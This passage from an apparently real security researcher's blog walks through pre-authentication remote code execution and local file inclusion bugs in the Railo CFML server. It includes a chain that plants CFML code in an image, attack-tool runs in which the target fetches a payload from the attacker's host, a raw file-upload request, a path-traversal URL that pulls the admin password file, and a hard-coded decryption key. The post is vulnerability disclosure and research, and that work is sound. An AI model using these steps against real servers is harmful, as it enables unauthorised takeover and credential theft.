</span><span class='line'>    &lt;/cfif&gt;
</span><span class='line'>    &lt;cfif img.width GT url.width&gt;
</span><span class='line'>        &lt;cfimage action="resize" source="#img#" width="#url.width#" name="img"&gt;
</span><span class='line'>    &lt;/cfif&gt;
</span><span class='line'>    &lt;cfset data=toBinary(img)&gt;
</span><span class='line'>&lt;/cfif&gt;</span></code></pre></td></tr></table></div></figure>


<p>The <code>cffile</code> tag is used to read the raw image and then cast it via the <code>cfimage</code> tag.  The wonderful thing about <code>cffile</code> is that we can provide URLs that it will arbitrarily retrieve.  So, our URL can be this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.1.219:8888/railo-context/admin/thumbnail.cfm?img=http://192.168.1.97:8000/my_image.png&width=5000&height=50000</span></code></pre></td></tr></table></div></figure>


<p>And Railo will go and fetch the image and cast it.  Note that if a height and width are not provided it will attempt to resize it; we don&rsquo;t want this, and thus we provide large width and height values.  This file is written out to <code>/railo/temp/admin-ext-thumbnails/[HASH].[EXTENSION]</code>.</p>

<p>We&rsquo;ve now successfully written a file onto the remote system, and need a way to retrieve it.  The temp folder is not accessible from the web root, so we need some sort of LFI to fetch it.  Enter <code>jsloader.cfc</code>.</p>

<p><code>jsloader.cfc</code> is a Railo component used to fetch and load Javascript files.  In this file is a CF tag called <code>get</code>, which accepts a single argument <code>lib</code>, which the tag will read and return.  We can use this to fetch arbitrary Javascript files on the system and load them onto the page.  Note that it MUST be a Javascript file, as the extension is hard-coded into the file and null bytes don&rsquo;t work here, like they would in PHP.  Here&rsquo;s the relevant code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfset var filePath = expandPath('js/#arguments.lib#.js')/&gt;
</span><span class='line'>    &lt;cfset var local = {result=""} /&gt;&lt;cfcontent type="text/javascript"&gt;
</span><span class='line'>        &lt;cfsavecontent variable="local.result"&gt;
</span><span class='line'>            &lt;cfif fileExists(filePath)&gt;
</span><span class='line'>                &lt;cfinclude template="js/#arguments.lib#.js"/&gt;
</span><span class='line'>            &lt;/cfif&gt;
</span><span class='line'>        &lt;/cfsavecontent&gt;
</span><span class='line'>    &lt;cfreturn local.result /&gt;</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s tie all this together.  Using <code>thumbnail.cfm</code>, we can write well-formed images to the file system, and using the <code>jsloader.cfc</code> file, we can read arbitrary Javascript.  Recall how log injection works with PHP; we can inject PHP tags into arbitrary files so long as the file is loaded by PHP, and parsed accordingly.  We can fill a file full of junk, but if the parser has its way a single <code>&lt;?phpinfo();?&gt;</code> will be discovered and executed; the CFML engine works the same way.</p>

<p>Our attack becomes much more clear: we generate a well-formed PNG file, embed CFML code into the image (metadata), set the extension to <code>.js</code>, and write it via <code>thumbnail.cfm</code>.  We then retrieve the file via <code>jsloader.cfc</code> and, because we&rsquo;re loading it with a CFM file, it will be parsed and executed.  Let&rsquo;s check this out:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./clusterd.py -i 192.168.1.219 -a railo -v4.1 --deploy ./src/lib/resources/cmd.cfml --deployer jsload
</span><span class='line'>
</span><span class='line'>        clusterd/0.3.1 - clustered attack toolkit
</span><span class='line'>            [Supporting 6 platforms]
</span><span class='line'>
</span><span class='line'> [2014-06-15 03:39PM] Started at 2014-06-15 03:39PM
</span><span class='line'> [2014-06-15 03:39PM] Servers' OS hinted at windows
</span><span class='line'> [2014-06-15 03:39PM] Fingerprinting host '192.168.1.219'
</span><span class='line'> [2014-06-15 03:39PM] Server hinted at 'railo'
</span><span class='line'> [2014-06-15 03:39PM] Checking railo version 4.1 Railo Server...
</span><span class='line'> [2014-06-15 03:39PM] Checking railo version 4.1 Railo Server Administrator...
</span><span class='line'> [2014-06-15 03:39PM] Checking railo version 4.1 Railo Web Administrator...
</span><span class='line'> [2014-06-15 03:39PM] Matched 2 fingerprints for service railo
</span><span class='line'> [2014-06-15 03:39PM]   Railo Server Administrator (version 4.1)
</span><span class='line'> [2014-06-15 03:39PM]   Railo Web Administrator (version 4.1)
</span><span class='line'> [2014-06-15 03:39PM] Fingerprinting completed.
</span><span class='line'> [2014-06-15 03:39PM] This deployer (jsload_lfi) requires an external listening port (8000).  Continue? [Y/n] &gt; 
</span><span class='line'> [2014-06-15 03:39PM] Preparing to deploy cmd.cfml...
</span><span class='line'> [2014-06-15 03:40PM] Waiting for remote server to download file [5s]]
</span><span class='line'> [2014-06-15 03:40PM] Invoking stager and deploying payload...
</span><span class='line'> [2014-06-15 03:40PM] Waiting for remote server to download file [7s]]
</span><span class='line'> [2014-06-15 03:40PM] cmd.cfml deployed at /railo-context/cmd.cfml
</span><span class='line'> [2014-06-15 03:40PM] Finished at 2014-06-15 03:40PM</span></code></pre></td></tr></table></div></figure>


<p>A couple things to note; as you may notice, the module currently requires the Railo server to connect back twice.  Once is for the image with embedded CFML, and the second for the payload.  We embed only a stager in the image that then connects back for the actual payload.</p>

<p>Sadly, the LFI was unknowingly killed in 4.2.1 with the following fix to <code>jsloader.cfc</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfif arguments.lib CT ".."&gt;
</span><span class='line'>    &lt;cfheader statuscode="400"&gt;
</span><span class='line'>    &lt;cfreturn "// 400 - Bad Request"&gt;
</span><span class='line'>&lt;/cfif&gt;</span></code></pre></td></tr></table></div></figure>


<p>The <code>arguments.lib</code> variable contains our controllable path, but it kills our ability to traverse out.  Unfortunately, we can&rsquo;t substitute the .. with unicode or utf-16 due to the way Jetty and Java are configured, by default.  This file is pretty much useless to us now, unless we can write into the folder that <code>jsloader.cfc</code> reads from; then we don&rsquo;t need to traverse out at all.</p>

<p>We can still pop this on Express installs, due to the Jetty LFI discussed in part 3.  By simply traversing into the extensions folder, we can load up the Javascript file and execute our shell.  Railo installs still prove elusive.</p>

<p>buuuuuuuuuuuuuuuuuuuuuuuuut</p>

<p>Recall the <code>img.cfm</code> LFI from part 3; by tip-toeing back into the admin-ext-thumbnails folder, we can summon our vulnerable image and execute whatever coldfusion we shove into it.  This proves to be an even better choice than <code>jsloader.cfc</code>, as we don&rsquo;t need to traverse as far.  This bug only affects versions 4.1 &ndash; 4.2.1, as <code>thumbnail.cfm</code> wasn&rsquo;t added until 4.1.  <code>CVE-2014-5468</code> has been assigned to this issue.</p>

<p>The second RCE vulnerability is a bit easier and has a larger attack vector, spanning all versions of Railo.  As previously noted, Railo does not do per page/URL authentication, but rather enforces it when making changes via the <code>&lt;cfadmin&gt;</code> tag.  Due to this, any pages doing naughty things without checking with the tag may be exploitable, as previously seen.  Another such file is <code>overview.uploadNewLangFile.cfm</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfif structKeyExists(form, "newLangFile")&gt;
</span><span class='line'>    &lt;cftry&gt;
</span><span class='line'>        &lt;cffile action="UPLOAD" filefield="form.newLangFile" destination="#expandPath('resources/language/')#" nameconflict="ERROR"&gt;
</span><span class='line'>        &lt;cfcatch&gt;
</span><span class='line'>            &lt;cfthrow message="#stText.overview.langAlreadyExists#"&gt;
</span><span class='line'>        &lt;/cfcatch&gt;
</span><span class='line'>    &lt;/cftry&gt;
</span><span class='line'>    &lt;cfset sFile = expandPath("resources/language/" & cffile.serverfile)&gt;
</span><span class='line'>    &lt;cffile action="READ" file="#sFile#" variable="sContent"&gt;
</span><span class='line'>    &lt;cftry&gt;
</span><span class='line'>        &lt;cfset sXML     = XMLParse(sContent)&gt;
</span><span class='line'>        &lt;cfset sLang    = sXML.language.XMLAttributes.label&gt;
</span><span class='line'>        &lt;cfset stInLang = GetFromXMLNode(sXML.XMLRoot.XMLChildren)&gt;
</span><span class='line'>        &lt;cfcatch&gt;
</span><span class='line'>            &lt;cfthrow message="#stText.overview.ErrorWhileReadingLangFile#"&gt;
</span><span class='line'>        &lt;/cfcatch&gt;
</span><span class='line'>    &lt;/cftry&gt;</span></code></pre></td></tr></table></div></figure>


<p>I mean, this might as well be an upload form to write arbitrary files.  It&rsquo;s stupid simple to get arbitrary data written to the system:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>POST /railo-context/admin/overview.uploadNewLangFile.cfm HTTP/1.1
</span><span class='line'>Host: localhost:8888
</span><span class='line'>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0 Iceweasel/18.0.1
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span><span class='line'>Accept-Language: en-US,en;q=0.5
</span><span class='line'>Accept-Encoding: gzip, deflate
</span><span class='line'>Referer: http://localhost:8888/railo-context/admin/server.cfm
</span><span class='line'>Connection: keep-alive
</span><span class='line'>Content-Type: multipart/form-data; boundary=AaB03x
</span><span class='line'>Content-Length: 140
</span><span class='line'>
</span><span class='line'>--AaB03x
</span><span class='line'>Content-Disposition: form-data; name="newLangFile"; filename="xxxxxxxxx.lang"
</span><span class='line'>Content-Type: text/plain
</span><span class='line'>
</span><span class='line'>thisisatest
</span><span class='line'>--AaB03x--</span></code></pre></td></tr></table></div></figure>


<p>The tricky bit is where it&rsquo;s written to; Railo uses a compression system that dynamically generates compressed versions of the web server, contained within <code>railo-context.ra</code>.  A mirror of these can be found under the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[ROOT]\webapps\ROOT\WEB-INF\railo\temp\compress</span></code></pre></td></tr></table></div></figure>


<p>The compressed data is then obfuscated behind two more folders, both MD5s.  In my example, it becomes:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[ROOT]\webapps\ROOT\WEB-INF\railo\temp\compress\88d817d1b3c2c6d65e50308ef88e579c\0bdbf4d66d61a71378f032ce338258f2</span></code></pre></td></tr></table></div></figure>


<p>So we cannot simply traverse into this path, as the hashes change every single time a file is added, removed, or modified.  I&rsquo;ll walk the logic used to generate these, but as a precusor, we aren&rsquo;t going to figure these out without some other fashionable info disclosure bug.</p>

<p>The hashes are calculated in <code>railo-java/railo-core/src/railo/commons/io/res/type/compress/Compress.java</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>temp=temp.getRealResource("compress");                
</span><span class='line'>temp=temp.getRealResource(MD5.getDigestAsString(cid+"-"+ffile.getAbsolutePath()));
</span><span class='line'>if(!temp.exists())temp.createDirectory(true);
</span><span class='line'>}
</span><span class='line'>catch(Throwable t){}
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>    if(temp!=null) {
</span><span class='line'>        String name=Caster.toString(actLastMod)+":"+Caster.toString(ffile.length());
</span><span class='line'>        name=MD5.getDigestAsString(name,name);
</span><span class='line'>        root=temp.getRealResource(name);
</span><span class='line'>        if(actLastMod&gt;0 && root.exists()) return;</span></code></pre></td></tr></table></div></figure>


<p>The first hash is then <code>cid + "-" + ffile.getAbsolutePath()</code>, where <code>cid</code> is the randomly generated ID found in the <code>id</code> file (see part two) and <code>ffile.getAbsolutePath()</code> is the full path to the classes resource.  This is doable if we have the XXE, but 4.1+ is inaccessible.</p>

<p>The second hash is <code>actLastMode + ":" + ffile.length()</code>, where <code>actLastMode</code> is the last modified time of the file and <code>ffile.length()</code> is the obvious file length.  Again, this is likely not brute forcable without a serious infoleak vulnerability.  Hosts &lt;= 4.0 are exploitable, as we can list files with the XXE via the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bryan@debdev:~/tools/clusterd$ python http_test_xxe.py 
</span><span class='line'>88d817d1b3c2c6d65e50308ef88e579c
</span><span class='line'>
</span><span class='line'>[SNIP - in which we modify the path to include ^]
</span><span class='line'>
</span><span class='line'>bryan@debdev:~/tools/clusterd$ python http_test_xxe.py
</span><span class='line'>0bdbf4d66d61a71378f032ce338258f2
</span><span class='line'>
</span><span class='line'>[SNIP - in which we modify the path to include ^]
</span><span class='line'>
</span><span class='line'>bryan@debdev:~/tools/clusterd$ python http_test_xxe.py
</span><span class='line'>admin
</span><span class='line'>admin_cfc$cf.class
</span><span class='line'>admin_cfm$cf.class
</span><span class='line'>application_cfc$cf.class
</span><span class='line'>application_cfm$cf.class
</span><span class='line'>component_cfc$cf.class
</span><span class='line'>component_dump_cfm450$cf.class
</span><span class='line'>doc
</span><span class='line'>doc_cfm$cf.class
</span><span class='line'>form_cfm$cf.class
</span><span class='line'>gateway
</span><span class='line'>graph_cfm$cf.class
</span><span class='line'>jquery_blockui_js_cfm1012$cf.class
</span><span class='line'>jquery_js_cfm322$cf.class
</span><span class='line'>META-INF
</span><span class='line'>railo_applet_cfm270$cf.class
</span><span class='line'>res
</span><span class='line'>templates
</span><span class='line'>wddx_cfm$cf.class</span></code></pre></td></tr></table></div></figure>


<p><code>http_test_xxe.py</code> is just a small hack I wrote to exploit the XXE, in which we eventually obtain both valid hashes.  So we can exploit this in versions &lt;= 4.0 Express.  Later versions, as far as I can find, have no discernible way of obtaining full RCE without another infoleak or resorting to a slow, loud, painful death of brute forcing two MD5 hashes.</p>

<p>The first RCE is currently available in clusterd dev, and a PR is being made to Metasploit thanks to @BrandonPrry.  Hopefully it can be merged shortly.</p>

<p>As we conclude our Railo analysis, lets quickly recap the vulnerabilities discovered during this audit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Version 4.2:
</span><span class='line'>    - Pre-authentication LFI via `img.cfm` (Install/Express)
</span><span class='line'>    - Pre-authentication LFI via Jetty CVE (Express)
</span><span class='line'>    - Pre-authentication RCE via `img.cfm` and `thumbnail.cfm` (Install/Express)
</span><span class='line'>    - Pre-authentication RCE via `jsloader.cfc` and `thumbnail.cfm` (Install/Express) (Up to version 4.2.0)
</span><span class='line'>Version 4.1:
</span><span class='line'>    - Pre-authentication LFI via `img.cfm` (Install/Express)
</span><span class='line'>    - Pre-authentication LFI via Jetty CVE (Express)
</span><span class='line'>    - Pre-authentication RCE via `img.cfm` and `thumbnail.cfm` (Install/Express)
</span><span class='line'>    - Pre-authentication RCE via `jsloader.cfc` and `thumbnail.cfm` (Install/Express)
</span><span class='line'>Version 4.0:
</span><span class='line'>    - Pre-authentication LFI via XXE (Install/Express)
</span><span class='line'>    - Pre-authentication LFI via Jetty CVE (Express)
</span><span class='line'>    - Pre-authentication LFI via `img.cfm` (Install/Express)
</span><span class='line'>    - Pre-authentication RCE via XXE and `overview.uploadNewLangFile` (Install/Express)
</span><span class='line'>    - Pre-authentication RCE via `jsloader.cfc` and `thumbnail.cfm` (Install/Express)
</span><span class='line'>    - Pre-authentication RCE via `img.cfm` and `thumbnail.cfm` (Install/Express)
</span><span class='line'>Version 3.x:
</span><span class='line'>    - Pre-authentication LFI via `img.cfm` (Install/Express)
</span><span class='line'>    - Pre-authentication LFI via Jetty CVE (Express)
</span><span class='line'>    - Pre-authentication LFI via XXE (Install/Express)
</span><span class='line'>    - Pre-authentication RCE via XXE and `overview.uploadNewLangFile` (Express)</span></code></pre></td></tr></table></div></figure>


<p>This does not include the random XSS bugs or post-authentication issues.  At the end of it all, this appears to be a framework with great ideas, but <em>desperately</em> in need of code TLC.  Driving forward with a checklist of features may look nice on a README page, but the desolate wasteland of code left behind can be a scary thing.  Hopefully the Railo guys take note and spend some serious time evaluating and improving existing code.  The bugs found during this series have been disclosed to the developers; here&rsquo;s to hoping they follow through.</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-getrailo-error.jpg"></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[railo security - part three - pre-authentication LFI]]></title>
    <link href="http://hatRiot.github.io/blog/2014/08/23/railo-security-part-three/"/>
    <updated>2014-08-23T14:00:00-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/08/23/railo-security-part-three</id>
    <content type="html"><![CDATA[<p><em><a href="http://hatriot.github.io/blog/2014/06/25/railo-security-part-one/">Part one &ndash; intro</a></em><br/>
<em><a href="http://hatriot.github.io/blog/2014/07/24/railo-security-part-two/">Part two &ndash; post-authentication rce</a></em><br/>
<em>Part three &ndash; pre-authentication LFI</em><br/>
<em><a href="http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/">Part four &ndash; pre-authentication rce</a></em></p>

<p>This post continues our four part Railo security analysis with three pre-authentication LFI vulnerabilities.  These allow anonymous users access to retrieve the administrative plaintext password and login to the server&rsquo;s administrative interfaces.  If you&rsquo;re unfamiliar with Railo, I recommend at the very least reading part one of this series.  The most significant LFI discussed has been implemented as auxiliary modules in <a href="http://github.com/hatRiot/clusterd">clusterd</a>, though they&rsquo;re pretty trivial to exploit on their own.</p>

<p>We&rsquo;ll kick this portion off by introducing a pre-authentication LFI vulnerability that affects all versions of Railo Express; if you&rsquo;re unfamiliar with the Express install, it&rsquo;s really just a self-contained, no-installation-necessary package that harnesses Jetty to host the service.   The flaw actually has nothing to do with Railo itself, but rather in this packaged web server, Jetty.  <a href="http://www.cvedetails.com/cve/CVE-2007-6672/">CVE-2007-6672</a> addresses this issue, but it appears that the Railo folks have not bothered to update this.  Via the browser, we can pull the config file, complete with the admin hash, with <code>http://[host]:8888/railo-context/admin/..\..\railo-web.xml.cfm</code>.</p>

<p>A quick run of this in clusterd on Railo 4.0:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./clusterd.py -i 192.168.1.219 -a railo -v4.0 --rl-pw
</span><span class='line'>
</span><span class='line'>        clusterd/0.3 - clustered attack toolkit
</span><span class='line'>            [Supporting 6 platforms]
</span><span class='line'>
</span><span class='line'> [2014-05-15 06:25PM] Started at 2014-05-15 06:25PM
</span><span class='line'> [2014-05-15 06:25PM] Servers' OS hinted at windows
</span><span class='line'> [2014-05-15 06:25PM] Fingerprinting host '192.168.1.219'
</span><span class='line'> [2014-05-15 06:25PM] Server hinted at 'railo'
</span><span class='line'> [2014-05-15 06:25PM] Checking railo version 4.0 Railo Server...
</span><span class='line'> [2014-05-15 06:25PM] Checking railo version 4.0 Railo Server Administrator...
</span><span class='line'> [2014-05-15 06:25PM] Checking railo version 4.0 Railo Web Administrator...
</span><span class='line'> [2014-05-15 06:25PM] Matched 3 fingerprints for service railo
</span><span class='line'> [2014-05-15 06:25PM]   Railo Server (version 4.0)
</span><span class='line'> [2014-05-15 06:25PM]   Railo Server Administrator (version 4.0)
</span><span class='line'> [2014-05-15 06:25PM]   Railo Web Administrator (version 4.0)
</span><span class='line'> [2014-05-15 06:25PM] Fingerprinting completed.
</span><span class='line'> [2014-05-15 06:25PM] Attempting to pull password...
</span><span class='line'> [2014-05-15 06:25PM] Fetched encrypted password, decrypting...
</span><span class='line'> [2014-05-15 06:25PM] Decrypted password: default
</span><span class='line'> [2014-05-15 06:25PM] Finished at 2014-05-15 06:25PM</span></code></pre></td></tr></table></div></figure>


<p>and on the latest release of Railo, 4.2:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./clusterd.py -i 192.168.1.219 -a railo -v4.2 --rl-pw
</span><span class='line'>
</span><span class='line'>        clusterd/0.3 - clustered attack toolkit
</span><span class='line'>            [Supporting 6 platforms]
</span><span class='line'>
</span><span class='line'> [2014-05-15 06:28PM] Started at 2014-05-15 06:28PM
</span><span class='line'> [2014-05-15 06:28PM] Servers' OS hinted at windows
</span><span class='line'> [2014-05-15 06:28PM] Fingerprinting host '192.168.1.219'
</span><span class='line'> [2014-05-15 06:28PM] Server hinted at 'railo'
</span><span class='line'> [2014-05-15 06:28PM] Checking railo version 4.2 Railo Server...
</span><span class='line'> [2014-05-15 06:28PM] Checking railo version 4.2 Railo Server Administrator...
</span><span class='line'> [2014-05-15 06:28PM] Checking railo version 4.2 Railo Web Administrator...
</span><span class='line'> [2014-05-15 06:28PM] Matched 3 fingerprints for service railo
</span><span class='line'> [2014-05-15 06:28PM]   Railo Server (version 4.2)
</span><span class='line'> [2014-05-15 06:28PM]   Railo Server Administrator (version 4.2)
</span><span class='line'> [2014-05-15 06:28PM]   Railo Web Administrator (version 4.2)
</span><span class='line'> [2014-05-15 06:28PM] Fingerprinting completed.
</span><span class='line'> [2014-05-15 06:28PM] Attempting to pull password...
</span><span class='line'> [2014-05-15 06:28PM] Fetched password hash: d34535cb71909c4821babec3396474d35a978948455a3284fd4e1bc9c547f58b
</span><span class='line'> [2014-05-15 06:28PM] Finished at 2014-05-15 06:28PM</span></code></pre></td></tr></table></div></figure>


<p>Using this LFI, we can pull the <code>railo-web.xml.cfm</code> file, which contains the administrative password.  Notice that 4.2 only dumps a hash, whilst 4.0 dumps a plaintext password.  This is because versions &lt;= 4.0 blowfish encrypt the password, and > 4.0 actually hashes it.  Here&rsquo;s the relevant code from Railo (ConfigWebFactory.java):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>private static void loadRailoConfig(ConfigServerImpl configServer, ConfigImpl config, Document doc) throws IOException  {
</span><span class='line'>        Element railoConfiguration = doc.getDocumentElement();
</span><span class='line'>
</span><span class='line'>        // password
</span><span class='line'>        String hpw=railoConfiguration.getAttribute("pw");
</span><span class='line'>        if(StringUtil.isEmpty(hpw)) {
</span><span class='line'>            // old password type
</span><span class='line'>            String pwEnc = railoConfiguration.getAttribute("password"); // encrypted password (reversable)
</span><span class='line'>            if (!StringUtil.isEmpty(pwEnc)) {
</span><span class='line'>                String pwDec = new BlowfishEasy("tpwisgh").decryptString(pwEnc);
</span><span class='line'>                hpw=hash(pwDec);
</span><span class='line'>            }
</span><span class='line'>        }
</span><span class='line'>        if(!StringUtil.isEmpty(hpw))
</span><span class='line'>            config.setPassword(hpw);
</span><span class='line'>        else if (configServer != null) {
</span><span class='line'>            config.setPassword(configServer.getDefaultPassword());
</span><span class='line'>        }</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>As above, they actually encrypted the password using a hard-coded symmetric key; this is where versions &lt;= 4.0 stop.  In > 4.0, after decryption they hash the password (SHA256) and use it as such.  Note that the encryption/decryption is no longer the actual password in > 4.0, so we cannot simply decrypt the value to use and abuse.</p>

<p>Due to the configuration of the web server, we can only pull CFM files; this is fine for the configuration file, but system files prove troublesome&hellip;</p>

<p><img src="http://diyblogger.net/wp-content/uploads/2010/12/billy-mays.jpg"></p>

<p>The second LFI is a trivial XXE that affects versions &lt;= 4.0, and is exploitable out-of-the-box with Metasploit.  Unlike the Jetty LFI, this affects all versions of Railo, both installed and express:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-xxe-msf.jpg"></p>

<p>Using this we cannot pull <code>railo-web.xml.cfm</code> due to it containing XML headers, and we cannot use the standard OOB methods for retrieving files.  Timothy Morgan gave a great <a href="http://2013.appsecusa.org/2013/wp-content/uploads/2013/12/WhatYouDidntKnowAboutXXEAttacks.pdf">talk</a> at OWASP Appsec 2013 that detailed a neat way of abusing Java XML parsers to obtain RCE via XXE.  The process is pretty interesting; if you submit a URL with a jar:// protocol handler, the server will download the zip/jar to a temporary location, perform some header parsing, and then delete it.  However, if you push the file and leave the connection open, the file will persist.  This vector, combined with one of the other LFI&rsquo;s, could be a reliable pre-authentication RCE, but I was unable to get it working.</p>

<p>The third LFI is just as trivial as the first two, and again stems from the pandemic problem of failing to authenticate at the URL/page level.  <code>img.cfm</code> is a file used to, you guessed it, pull images from the system for display.  Unfortunately, it fails to sanitize anything:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
